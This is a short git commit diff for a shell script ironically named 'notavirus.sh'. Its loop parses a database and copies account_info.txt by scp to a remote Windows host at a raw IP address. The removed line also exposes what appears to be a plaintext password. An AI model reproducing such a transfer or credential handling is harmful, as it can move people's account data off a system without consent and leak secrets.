a37fd783a9963ce71990c67f6e9c8baa85d3619f
Maya <77994029+mayasavino@users.noreply.github.com>
2023-12-11 20:08:49 -0700

    Update notavirus.sh
    revert :/

--- notavirus.sh
+++ notavirus.sh
@@ -8,7 +8,7 @@ do
     python3 db_parse.py $a
     echo Done.
     echo Copying info back ...
-    scp account_info.txt Jerry@12.34.56.71:C:\\Users\\Jerry\\Downloads | echo Lucky123
+    scp account_info.txt Jerry@12.34.56.71:C:\\Users\\Jerry\\Downloads
     echo Done.
     echo Finished.
 done
